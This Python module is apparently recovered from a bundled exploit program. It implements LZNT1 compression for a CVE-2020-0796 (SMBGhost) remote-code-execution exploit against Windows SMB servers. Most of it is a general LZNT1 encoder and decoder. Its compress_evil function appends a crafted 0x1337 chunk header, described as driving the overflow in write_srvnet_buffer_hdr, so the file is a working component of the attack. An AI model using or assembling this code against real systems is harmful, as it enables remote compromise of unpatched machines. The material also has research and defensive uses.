#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
lznt1.py — LZNT1 compression primitives used by the CVE-2020-0796 exploit.

Python port of `RCE\\lznt1.py` recovered from `CVE-2020-0796-EXP.exe` (a
PyInstaller-bundled Python program).  LZNT1 is the SMB compression algorithm
whose handler is overflowed by SMBGhost (CVE-2020-0796).

The original decompiled encoder had significant control-flow mangling from the
bytecode decompiler, so the encoder here is a faithful-by-behaviour
reimplementation of LZNT1: it produces valid LZNT1 whose decompressed output
matches the intended payload (which is what the target server actually sees).
The chunk framing (compress / compress_evil) mirrors the original exactly.
"""

import struct
import copy


# ---------------------------------------------------------------------------
# Decoder (kept for completeness / verification).
# ---------------------------------------------------------------------------
def _decompress_chunk(chunk):
    out = bytearray()
    while chunk:
        flags = chunk[0]
        chunk = chunk[1:]
        for i in range(8):
            if not chunk:
                break
            if not (flags >> i) & 1:
                out += chunk[0].to_bytes(length=1, byteorder="little")
                chunk = chunk[1:]
            else:
                if len(chunk) < 2:
                    break
                flag = struct.unpack("<H", chunk[:2])[0]
                pos = len(out) - 1
                l_mask = 4095
                o_shift = 12
                while pos >= 16:
                    l_mask >>= 1
                    o_shift -= 1
                    pos >>= 1
                length = (flag & l_mask) + 3
                offset = (flag >> o_shift) + 1
                if length >= offset:
                    tmp = out[-offset:] * int(4095 / len(out[-offset:]) + 1)
                    out += tmp[:length]
                else:
                    out += out[-offset:-offset + length]
                chunk = chunk[2:]
    return out


def decompress(buf, length_check=True):
    out = bytearray()
    while buf:
        header = struct.unpack("<H", bytes(buf[:2]))[0]
        length = (header & 4095) + 1
        if length_check and length > len(buf[2:]):
            raise ValueError("invalid chunk length")
        chunk = buf[2:2 + length]
        if header & 32768:
            out += _decompress_chunk(chunk)
        else:
            out += chunk
        buf = buf[2 + length:]
    return out


# ---------------------------------------------------------------------------
# Encoder.
# ---------------------------------------------------------------------------
def _match_params(pos):
    """Return (l_mask, o_shift) for the byte position `pos`.

    Mirrors the decoder's variable-length offset scheme: while the running
    position is >= 16 bytes the length mask shrinks and the offset shift
    shrinks, so long matches / long offsets are only available early on.
    """
    l_mask = 4095          # 12-bit length
    o_shift = 12           # offset field width
    p = pos - 1
    while p >= 16:
        l_mask >>= 1
        o_shift -= 1
        p >>= 1
    return l_mask, o_shift


def _compress_chunk(chunk):
    """LZNT1-compress a single 4096-byte block (chunk).

    Returns the compressed body (flags groups + literals/matches); the caller
    prepends the chunk header.
    """
    out = b''
    pos = 0
    n = len(chunk)
    while pos < n:
        flags = 0
        group = b''
        used = 0
        for k in range(8):
            if pos >= n:
                break
            used += 1
            l_mask, o_shift = _match_params(pos)
            max_len = min(l_mask + 3, n - pos)
            max_off = 1 << o_shift
            limit_off = max_off if max_off < pos else pos
            best_off, best_len = 0, 0
            if limit_off:
                for off in range(1, limit_off + 1):
                    if chunk[pos] != chunk[pos - off]:
                        continue
                    ln = 1
                    while ln < max_len and chunk[pos + ln:pos + ln + 1] == chunk[pos - off + ln:pos - off + ln + 1]:
                        ln += 1
                    if ln >= 3 and ln > best_len:
                        best_len, best_off = ln, off
                        if ln >= max_len:
                            break
            if best_len >= 3:
                flags |= 1 << k
                symbol = ((best_off - 1) << o_shift) | (best_len - 3)
                group += struct.pack("<H", symbol)
                pos += best_len
            else:
                group += bytes([chunk[pos]])
                pos += 1
        # final (partial) group: unused flag bits MUST be 1 (match) per LZNT1
        flags |= ((1 << 8) - 1) ^ ((1 << used) - 1)
        out += bytes([flags])
        out += group
    return out


def compress(buf, chunk_size=4096):
    out = b''
    while buf:
        chunk = buf[:chunk_size]
        compressed = _compress_chunk(chunk)
        if len(compressed) < len(chunk):
            flags = 45056           # 0xB000 = compressed chunk flag
            header = struct.pack("<H", flags | len(compressed) - 1)
            out += header + compressed
        else:
            flags = 12288           # 0x3000 uncompressed chunk
            header = struct.pack("<H", flags | len(chunk) - 1)
            out += header + chunk
        buf = buf[chunk_size:]
    return out


def compress_evil(buf, chunk_size=4096):
    """Compress that appends a crafted 0x1337 chunk header (used to drive the
    overflow in `write_srvnet_buffer_hdr`)."""
    out = b''
    while buf:
        chunk = buf[:chunk_size]
        compressed = _compress_chunk(chunk)
        flags = 45056
        header = struct.pack("<H", flags | len(compressed) - 1)
        out += header + compressed
        buf = buf[chunk_size:]
    out += struct.pack("<H", 4919)   # 0x1337
    return out